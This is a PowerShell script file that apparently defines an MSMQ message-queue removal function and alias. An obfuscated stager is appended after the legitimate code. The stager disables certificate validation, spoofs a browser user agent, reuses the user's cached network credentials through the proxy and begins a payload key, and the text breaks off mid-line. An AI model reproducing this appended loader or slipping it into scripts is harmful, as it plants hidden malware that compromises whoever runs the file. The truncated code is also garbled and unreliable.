
function Uninstall-CMsmqMessageQueue
{
    
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        
        $Name,
        
        [Switch]
        
        $Private
    )
    
    Set-StrictMode -Version 'Latest'
    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    $commonArgs = @{ 'Name' = $Name ; 'Private' = $Private }
    
    if( -not (Test-CMsmqMessageQueue @commonArgs) )
    {
        return
    }
    
    if( $pscmdlet.ShouldProcess( "MSMQ Message Queue $Name", "remove" ) )
    {
        try
        {
            [Messaging.MessageQueue]::Delete( (Get-CMsmqMessageQueuePath @commonArgs) )
        }
        catch
        {
            Write-Error $_
            return
        }
        while( Test-CMsmqMessageQueue @commonArgs )
        {
            Start-Sleep -Milliseconds 100
        }
    }
}

Set-Alias -Name 'Remove-MsmqMessageQueue' -Value 'Uninstall-CMsmqMessageQueue'


[SYSteM.Net.SERViCEPOINTManAgEr]::EXPEct100COnTInuE = 0;$Wc=New-ObJecT SySteM.Net.WeBCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeADeRS.AdD('User-Agent',$u);$wC.PRoXy = [SYSTem.NeT.WEbReQuesT]::DEFAULTWeBPrOxY;$WC.Proxy.CRedEnTIals = [SysTem.NET.CredENtIaLCACHe]::DEfAULTNeTWORkCredentiaLS;$K='myO84%?wt-JK&N*IxvV=apo`Y$rc

